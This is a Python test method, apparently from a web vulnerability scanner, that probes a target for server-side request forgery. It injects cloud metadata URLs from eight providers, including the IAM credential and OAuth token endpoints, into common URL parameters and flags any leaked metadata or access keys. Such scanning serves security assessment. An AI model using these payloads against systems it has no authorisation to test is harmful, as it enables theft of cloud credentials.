    def test_cloud_metadata_service_v2(self):
        """Wave2 Cloud #9 — Cloud Metadata Service (advanced, multi-cloud)."""
        if not self.deep: return
        self._print("[*]", "Wave2: Cloud Metadata v2...", "INFO")
        # AWS IMDS v2 requires token — try v1 first (still widely enabled)
        aws_imds_v1 = "http://169.254.169.254/latest/meta-data/"
        aws_imds_v2 = "http://169.254.169.254/latest/api/"
        aws_iam_creds = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        aws_user_data = "http://169.254.169.254/latest/user-data"
        # Azure
        azure_metadata = "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
        azure_token = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
        # GCP
        gcp_metadata = "http://metadata.google.internal/computeMetadata/v1/"
        gcp_token = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
        gcp_project = "http://metadata.google.internal/computeMetadata/v1/project/project-id"
        # Alibaba
        aliyun_metadata = "http://100.100.100.200/latest/meta-data/"
        # Oracle
        oracle_metadata = "http://169.254.169.254/opc/v2/instance/"
        # DigitalOcean
        do_metadata = "http://169.254.169.254/metadata/v1.json"
        # Packet/Equinix
        packet_metadata = "https://metadata.packet.net/metadata"
        # Tencent Cloud
        tencent_metadata = "http://metadata.tencentyun.com/latest/meta-data/"
        for param in ["url", "fetch", "proxy", "src", "remote", "uri",
                       "target", "host", "page", "include"]:
            for endpoint in [aws_imds_v1, aws_iam_creds, aws_user_data,
                              azure_metadata, azure_token,
                              gcp_metadata, gcp_token, gcp_project,
                              aliyun_metadata, oracle_metadata,
                              do_metadata, packet_metadata, tencent_metadata]:
                r = self._get(self.target, params={param: endpoint},
                                headers={"Metadata-Flavor": "Google"} if "google" in endpoint else {})
                if not r: continue
                txt = r.text or ""
                if "instance-id" in txt.lower() or "ami-id" in txt.lower():
                    self._add_vuln(f"Wave2 SSRF AWS Metadata: {param}",
                                    "CRITICAL", self.target,
                                    f"AWS metadata accessed via {param}",
                                    param=param, endpoint=endpoint)
                if "vmId" in txt or "azEnvironment" in txt:
                    self._add_vuln(f"Wave2 SSRF Azure Metadata: {param}",
                                    "CRITICAL", self.target,
                                    f"Azure metadata accessed via {param}",
                                    param=param, endpoint=endpoint)
                if "google" in txt.lower() and "project" in txt.lower():
                    self._add_vuln(f"Wave2 SSRF GCP Metadata: {param}",
                                    "CRITICAL", self.target,
                                    f"GCP metadata accessed via {param}",
                                    param=param, endpoint=endpoint)
                if "AccessKeyId" in txt and "SecretAccessKey" in txt:
                    self._add_vuln(f"Wave2 SSRF AWS IAM Creds Leak: {param}",
                                    "CRITICAL", self.target,
                                    f"AWS IAM credentials leaked via {param}",
                                    param=param, endpoint=endpoint)

